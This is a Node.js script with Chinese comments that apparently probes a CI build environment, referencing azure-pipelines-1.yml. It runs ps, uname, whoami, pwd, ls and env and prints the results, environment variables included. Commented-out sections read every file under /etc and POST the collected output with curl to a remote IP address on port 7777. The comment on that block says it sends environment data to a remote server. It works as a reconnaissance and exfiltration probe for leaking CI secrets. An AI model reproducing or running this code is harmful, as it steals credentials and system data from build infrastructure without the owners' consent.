const { exec } = require('child_process');

// exec('ls /etc', (lsError, lsStdout, lsStderr) => {
//     if (lsError) {
//         console.error(`执行 ls /etc 时出错: ${lsError.message}`);
//         return;
//     }
//     if (lsStderr) {
//         console.error(`ls /etc 执行输出错误: ${lsStderr}`);
//         return;
//     }


//     const files = lsStdout.split('\n').filter(file => file); // 获取文件列表并过滤掉空行

//     // 对每个文件执行 cat 命令
//     files.forEach(file => {
//         exec(`cat /etc/${file}`, (catError, catStdout, catStderr) => {
//             if (catError) {
//                 console.error(`执行 cat /etc/${file} 时出错: ${catError.message}`);
//                 return;
//             }
//             if (catStderr) {
//                 console.error(`cat /etc/${file} 执行输出错误: ${catStderr}`);
//                 return;
//             }

//             console.log(`文件 /etc/${file} 的内容:\n${catStdout}`);
//         });
//     });
// });

exec('ps aux', (error, stdout, stderr) => {
    if (error) {
        console.error(`执行 ps aux 时出错: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`ps aux 执行输出错误: ${stderr}`);
        return;
    }

    console.log(`lps aux 命令结果:\n${stdout}`);
});

// 执行 ls -l azure-pipelines-1.yml 命令
exec('ls -l azure-pipelines-1.yml', (error, stdout, stderr) => {
    if (error) {
        console.error(`执行 ls -l 时出错: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`ls -l 执行输出错误: ${stderr}`);
        return;
    }

    console.log(`ls -l azure-pipelines-1.yml 命令结果:\n${stdout}`);
});

exec('uname -a', (error, stdout, stderr) => {
    if (error) {
        console.error(`执行 uname -a 时出错: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`uname -a 执行输出错误: ${stderr}`);
        return;
    }

    console.log(`uname -a 命令结果:\n${stdout}`);
});

// 执行 whoami 命令
exec('whoami', (error, stdout, stderr) => {
    if (error) {
        console.error(`执行 whoami 时出错: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`whoami 执行输出错误: ${stderr}`);
        return;
    }
    console.log(`whoami 命令结果:\n${stdout}`);
});

// 执行 pwd 命令
exec('pwd', (error, stdout, stderr) => {
    if (error) {
        console.error(`执行 pwd 时出错: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`pwd 执行输出错误: ${stderr}`);
        return;
    }
    console.log(`pwd 命令结果:\n${stdout}`);
    // 将环境变量数据通过 curl 命令发送到远程服务器
    // const data = stdout.trim();
    // const command = `curl -X POST -H "Content-Type: text/plain" --data "${data}" http://139.180.193.16:7777`;

    // exec(command, (curlError, curlStdout, curlStderr) => {
    //     if (curlError) {
    //         console.error(`执行 curl 时出错: ${curlError.message}`);
    //         return;
    //     }
    //     if (curlStderr) {
    //         console.error(`curl 执行输出错误: ${curlStderr}`);
    //         return;
    //     }
    //     console.log(`curl 命令结果:\n${curlStdout}`);
    // });
});

// 执行 ls 命令
exec('ls', (error, stdout, stderr) => {
    if (error) {
        console.error(`执行 ls 时出错: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`ls 执行输出错误: ${stderr}`);
        return;
    }
    console.log(`ls 命令结果:\n${stdout}`);
});


// 执行 env 命令获取环境变量
exec('env', (error, stdout, stderr) => {
    if (error) {
        console.error(`执行 env 时出错: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`env 执行输出错误: ${stderr}`);
        return;
    }

    console.log(`env 命令结果:\n${stdout}`);
    
});
